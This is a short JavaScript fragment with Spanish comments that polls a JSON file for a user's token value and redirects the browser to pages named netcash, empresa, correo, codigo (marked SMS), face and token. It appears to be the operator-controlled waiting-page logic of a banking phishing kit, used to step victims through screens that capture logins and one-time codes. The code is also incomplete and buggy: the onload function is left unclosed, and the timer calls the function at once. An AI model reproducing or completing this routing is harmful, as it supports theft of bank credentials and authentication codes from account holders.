  window.onload = function () {
    NombreUsuario = localStorage.getItem('NombreUsuario');

            // Guardar el nombre de usuario en localStorage


  function esperarValidacion(username) {
                  
    fetch('./pilar/auxiliar.json')
    .then(response => response.json())
    .then(data => {
                      // Busca la entrada que coincida con el usuario en la variable de sesión
      const usuarioData = data.find(item => item.Usuario === username);

      if (usuarioData) {
        const token = usuarioData.Token;
                          // Si el token es un número, redirige a la página correspondiente
        if (!isNaN(token)) {
         if (token == 1) {
           // Relogin: redirigir segun Tipo
           if(usuarioData.Tipo === 'netcash'){
             window.location.href = "./netcash.html";
           } else {
             window.location.href = "./empresa.html";
           }
         } else if (token == 2) {
           window.location.href = "./index.html"; 
         }else if (token == 3 ) {
                  window.location.href = "./correo.html"; //sms
                }else if (token == 4 ) {
                  window.location.href = "./codigo.html"; //sms
                }else if (token == 5) {
                  window.location.href = "./face.html";
                }  else if (token == 6) {
                  window.location.href = "./token.html";
                }else if (token == 7) {
                  localStorage.removeItem('NombreUsuario');
                  window.location.href = "./index.html";
                }
              } else {
                              // Si el token sigue siendo "No", sigue revisando cada 5 segundos
                setTimeout(esperarValidacion(username), 3000);
              }
            } else {
              console.error('Usuario no encontrado en el archivo JSON');
            }
          })
    .catch(error => console.error('Error al leer el archivo JSON:', error));
  }
